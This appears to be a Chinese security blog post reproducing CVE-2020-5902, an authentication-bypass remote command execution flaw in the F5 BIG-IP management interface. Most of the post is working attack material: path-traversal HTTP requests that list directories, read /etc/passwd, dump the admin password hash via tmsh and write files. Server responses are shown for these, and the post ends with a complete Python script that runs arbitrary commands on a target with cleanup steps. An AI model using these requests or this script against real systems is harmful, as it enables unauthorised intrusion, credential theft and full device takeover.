<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞一、漏洞简介本次漏洞位于F5BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902），导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启&#x2F;禁用服务等。 二、漏洞影响BIG-IP 15.x: 15.1.0&#x2F;15.0.0BIG-">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/F5%20BIG-IP/%EF%BC%88CVE-2020-5902%EF%BC%89F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞一、漏洞简介本次漏洞位于F5BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902），导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启&#x2F;禁用服务等。 二、漏洞影响BIG-IP 15.x: 15.1.0&#x2F;15.0.0BIG-">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:56.193Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-F5 BIG-IP/（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/F5%20BIG-IP/%EF%BC%88CVE-2020-5902%EF%BC%89F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:56.193Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-5902）F5-BIG-IP-远程命令执行漏洞"><a href="#（CVE-2020-5902）F5-BIG-IP-远程命令执行漏洞" class="headerlink" title="（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞"></a>（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>本次漏洞位于F5<br>BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902），导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>BIG-IP 15.x: 15.1.0/15.0.0BIG-IP 14.x: 14.1.0 ~ 14.1.2BIG-IP 13.x: 13.1.0 ~ 13.1.3BIG-IP 12.x: 12.1.0 ~ 12.1.5BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="列当前文件"><a href="#列当前文件" class="headerlink" title="列当前文件"></a>列当前文件</h3><pre><code>/tmui/locallb/workspace/directoryList.jsp
</code></pre>
<p>Example:</p>
<pre><code>directoryPath=/usr/local/www/
</code></pre>
<p>1.png</p>
<h4 id="BurpSuite-Request"><a href="#BurpSuite-Request" class="headerlink" title="BurpSuite Request"></a>BurpSuite Request</h4><pre><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1
Host: www.0-sec.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>
<h4 id="BurpSuite-Response"><a href="#BurpSuite-Response" class="headerlink" title="BurpSuite Response"></a>BurpSuite Response</h4><pre><code>      &#123;
        &quot;dir&quot;: &quot;tmui&quot;,
        &quot;children&quot;: [
          &#123;
            &quot;dir&quot;: &quot;WEB-INF&quot;,
            &quot;children&quot;: [
              &#123;
                &quot;dir&quot;: &quot;classes&quot;,
                &quot;children&quot;: [
                  &#123;
                    &quot;dir&quot;: &quot;org&quot;,
                    &quot;children&quot;: [
                      &#123;
                        &quot;dir&quot;: &quot;apache&quot;,
                        &quot;children&quot;: [
                          &#123;
                            &quot;dir&quot;: &quot;jsp&quot;,
                            &quot;children&quot;: [
                              &#123;
                                &quot;dir&quot;: &quot;common&quot;,
                                &quot;children&quot;: [
                                  &#123;
                                    &quot;file&quot;: &quot;deleteconfirm_jsp.class&quot;
  
                                      ............................
</code></pre>
<h3 id="读取当前文件"><a href="#读取当前文件" class="headerlink" title="读取当前文件"></a>读取当前文件</h3><p>Example:</p>
<pre><code>/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
</code></pre>
<p>2.png</p>
<h4 id="BurpSuite-Requests"><a href="#BurpSuite-Requests" class="headerlink" title="BurpSuite Requests"></a>BurpSuite Requests</h4><pre><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1
Host: www.0-sec.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>
<h4 id="BurpSuite-Response-1"><a href="#BurpSuite-Response-1" class="headerlink" title="BurpSuite Response"></a>BurpSuite Response</h4><pre><code>&#123;
  &quot;output&quot;: &quot;root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ntmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin\nadmin:x:0:500:Admin User:/home/admin:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npostgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin\nf5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin\noprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\nhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin\napache:x:48:48:Apache:/usr/local/www:/sbin/nologin\ntomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin\nmysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin\nnamed:x:25:25:Named:/var/named:/bin/false\nqemu:x:107:107:qemu user:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nsdm:x:498:495:sdmuser:/var/sdm:/bin/false\nntp:x:38:38::/etc/ntp:/sbin/nologin\nsyscheck:x:199:10::/:/sbin/nologin\nrestnoded:x:198:198::/:/sbin/nologin\ntwister5:x:0:500:twister5:/home/twister5:/bin/bash\n&quot;
&#125;
</code></pre>
<h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><pre><code>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin
admin:x:0:500:Admin User:/home/admin:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
postgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin
f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
hsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin
apache:x:48:48:Apache:/usr/local/www:/sbin/nologin
tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin
mysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin
named:x:25:25:Named:/var/named:/bin/false
qemu:x:107:107:qemu user:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
sdm:x:498:495:sdmuser:/var/sdm:/bin/false
ntp:x:38:38::/etc/ntp:/sbin/nologin
syscheck:x:199:10::/:/sbin/nologin
restnoded:x:198:198::/:/sbin/nologin
twister5:x:0:500:twister5:/home/twister5:/bin/bash
</code></pre>
<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>Example:</p>
<pre><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
</code></pre>
<p><code>list auth user</code> look all user</p>
<p><code>list auth user admin</code> only look admin user</p>
<p><a target="_blank" rel="noopener" href="https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions3.png">https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions3.png</a></p>
<pre><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin HTTP/1.1
Host: www.0-sec.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
&#123;
  &quot;error&quot;: &quot;&quot;,
  &quot;output&quot;: &quot;auth user admin &#123;\n    description \&quot;Admin User\&quot;\n    encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1\n    partition Common\n    partition-access &#123;\n        all-partitions &#123;\n            role admin\n        &#125;\n    &#125;\n    shell tmsh\n&#125;\n&quot;
&#125;
</code></pre>
<h4 id="format-1"><a href="#format-1" class="headerlink" title="format"></a>format</h4><pre><code>    description &quot;Admin User&quot;
    encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1
    partition Common
    partition-access &#123;
        all-partitions &#123;
            role admin
        &#125;
    &#125;
    shell tmsh
&#125;
</code></pre>
<h4 id="WorkspaceUtils-runTmshCommand"><a href="#WorkspaceUtils-runTmshCommand" class="headerlink" title="WorkspaceUtils.runTmshCommand"></a>WorkspaceUtils.runTmshCommand</h4><pre><code>JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request);
/usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand
  public static JSONObject runTmshCommand(String command, HttpServletRequest request) &#123;
    F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class);
    JSONObject resultObject = new JSONObject();
    String output = &quot;&quot;;
    String error = &quot;&quot;;
    if (!csrfValidated(request.getHeader(&quot;_bufvalue&quot;), request.getHeader(&quot;_timenow&quot;), request.getHeader(&quot;Tmui-Dubbuf&quot;))) &#123;
      logger.warn(&quot;Invalid user token - token provided by user is not authorized&quot;);
      resultObject.put(&quot;output&quot;, output);
      resultObject.put(&quot;error&quot;, NLSEngine.getString(&quot;ilx.workspace.error.InvalidUserToken&quot;));
      return resultObject;
    &#125; 
    if (&quot;POST&quot;.equalsIgnoreCase(request.getMethod())) &#123;
      String[] cmdArray = command.split(&quot; &quot;);
      String operation = cmdArray[0];
      String module = cmdArray[2];
      if (!ShellCommandValidator.checkForBadShellCharacters(command) &amp;&amp; (operation.equals(&quot;create&quot;) || operation.equals(&quot;delete&quot;) || operation.equals(&quot;list&quot;) || operation.equals(&quot;modify&quot;)) &amp;&amp; WHITELISTED_TMSH_MODULES.contains(module)) &#123;
        try &#123;
          String[] args = &#123; command &#125;;
          Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args);
          output = result.getOutput();
          error = result.getError();
        &#125; catch (com.f5.tmui.util.Syscall.CallException e) &#123;
          logger.error(NLSEngine.getString(&quot;ilx.workspace.error.TmshCommandFailed&quot;) + &quot;: &quot; + e.getMessage());
          error = e.getMessage();
        &#125; 
      &#125; else &#123;
        error = NLSEngine.getString(&quot;ilx.workspace.error.RejectedTmshCommand&quot;);
      &#125; 
    &#125; else &#123;
      error = NLSEngine.getString(&quot;ilx.workspace.error.InvalidMethod&quot;);
    &#125; 
    resultObject.put(&quot;output&quot;, output);
    resultObject.put(&quot;error&quot;, error);
    return resultObject;
  &#125;
</code></pre>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>Example: <code>/tmui/locallb/workspace/fileSave.jsp</code></p>
<p>POST: <code>fileName=/tmp/1.txt&amp;content=CVE-2020-5902</code></p>
<p>4.png</p>
<h4 id="Burpsuite-Requests"><a href="#Burpsuite-Requests" class="headerlink" title="Burpsuite Requests"></a>Burpsuite Requests</h4><pre><code>POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1
Host: www.0-sec.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

fileName=/tmp/1.txt&amp;content=CVE-2020-5902



HTTP/1.1 200 OK
Date: Mon, 06 Jul 2020 02:05:29 GMT
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=16070400; includeSubDomains
Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src &#39;self&#39;  &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data:  http://127.4.1.1 http://127.4.2.1
Vary: Accept-Encoding
Content-Length: 4
Connection: close
</code></pre>
<h4 id="File-Read-tmp-1-txt"><a href="#File-Read-tmp-1-txt" class="headerlink" title="File Read /tmp/1.txt"></a>File Read /tmp/1.txt</h4><p>5.png</p>
<pre><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt HTTP/1.1
Host: www.0-sec.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
HTTP/1.1 200 OK
Date: Mon, 06 Jul 2020 02:06:07 GMT
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=16070400; includeSubDomains
Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src &#39;self&#39;  &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data:  http://127.4.1.1 http://127.4.2.1
Vary: Accept-Encoding
Content-Length: 32
Connection: close





&#123;&quot;output&quot;:&quot;CVE-2020-5902\n&quot;&#125;
</code></pre>
<h4 id="upload-tmp-1-txt-Successful-！"><a href="#upload-tmp-1-txt-Successful-！" class="headerlink" title="upload /tmp/1.txt Successful ！"></a>upload /tmp/1.txt Successful ！</h4><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>6.png</p>
<pre><code>#coding:utf-8
import requests
import json
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import uuid
import sys

# tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
# fileSave.jsp?fileName=/tmp/cmd&amp;content=id
# tmshCmd.jsp?command=list+/tmp/cmd
# tmshCmd.jsp?command=delete+cli+alias+private+list

banner = r&#39;&#39;&#39;
 _______  _______    ______  _________ _______   _________ _______    _______  _______  _______ 
(  ____ \(  ____ \  (  ___ \ \__   __/(  ____ \  \__   __/(  ____ )  (  ____ )(  ____ \(  ____     | (    \/| (    \/  | (   ) )   ) (   | (    \/     ) (   | (    )|  | (    )|| (    \/| (    \/
| (__    | (____    | (__/ /    | |   | |           | |   | (____)|  | (____)|| |      | (__    
|  __)   (_____ \   |  __ (     | |   | | ____      | |   |  _____)  |     __)| |      |  __)   
| (            ) )  | (  \ \    | |   | | \_  )     | |   | (        | (\ (   | |      | (      
| )      /\____) )  | )___) )___) (___| (___) |  ___) (___| )        | ) \ \__| (____/\| (____/    |/       \______/   |/ \___/ \_______/(_______)  \_______/|/         |/   \__/(_______/(_______/
                                                                                                
                        CVE-2020-5902 UnAuth RCE Vuln
                            Python By Jas502n
From: https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb
____________________________________________________________________________________________________________________________________________________
&#39;&#39;&#39;

def tmshCmd_exit(url,file,cmd):
    tmshCmd_url = url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;
    proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;
    r = requests.get(tmshCmd_url,verify=False,allow_redirects=False)
    # r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies)

    response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])
    # print type(response_str)
    # print response_str
    if r.status_code == 200 and &#39;tmui&#39; in response_str:
        # print tmshCmd_url
        print &quot;[+] tmshCmd.jsp Exit!&quot;
        print &quot;[+] create cli alias private list command bash \n&quot;
        # cmd = &#39;whoami&#39;
        upload_exit(url,file,cmd)


    else:
        print &quot;[+] tmshCmd.jsp No Exit!\n&quot;

def upload_exit(url,file,cmd):
    fileSave_url = url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&amp;content=&quot;%file + cmd
    proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;
    r = requests.get(fileSave_url,verify=False,allow_redirects=False)
    # r = requests.get(fileSave_url,verify=False,allow_redirects=False,proxies=proxies)
    response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])
    if r.status_code == 200 and &#39;tmui&#39; in response_str:
        # print fileSave_url
        print &quot;[+] fileSave.jsp Exit!\n&quot;
        list_command(url,file)
    else:
        print &quot;[+] fileSave.jsp No Exit!\n&quot;

def list_command(url,file):
    rce_url = url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s&quot; % file
    proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;
    r = requests.get(rce_url,verify=False,allow_redirects=False)
    # r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies)
    response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])
    # print len(r.content)
    if r.status_code == 200 and &#39;tmui&#39; in response_str:
        if len(r.content) &gt; 33:
            # print rce_url
            print &quot;[+] Command Successfull !\n&quot;
            command_result = json.loads(r.content)
            print &quot;_&quot;*90,&#39;\n\n&#39;
            print command_result[&#39;output&#39;]
            print &quot;_&quot;*90,&quot;\n\n&quot;
            delete_list(url)
    else:
        print &quot;[+] Command Failed !\n&quot;

def delete_list(url):
    delete_url = url + &#39;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&#39;
    proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;
    r = requests.get(delete_url,verify=False,allow_redirects=False)
    # r = requests.get(delete_url,verify=False,allow_redirects=False,proxies=proxies)
    response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])
    if r.status_code == 200 and &#39;tmui&#39; in response_str:
        # print delete_url
        print &quot;[+] delete cli alias private list Successfull! \n&quot;
    else:
        print &quot;[+] delete cli alias private list Failed! \n&quot;






if __name__ == &#39;__main__&#39;:
    print banner
    while 1:
        url = &quot;https://x.x.x.x/&quot;
        # url = sys.argv[1]
        file = str(uuid.uuid1())
        print &quot;/tmp/&quot; + file,&quot;\n&quot;
        cmd = raw_input(&quot;[+]Set Cmd= &quot;)
        print
        tmshCmd_exit(url,file,cmd)
</code></pre>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/F5%20BIG-IP/%EF%BC%88CVE-2020-5902%EF%BC%89F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qov3006ty8v19f7eal45" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/FastAdmin/FastAdmin%20csrf+%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/F5%20BIG-IP/(CVE-2021-22986)%20F5%20BIG-IP%20iControl%20RCE/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>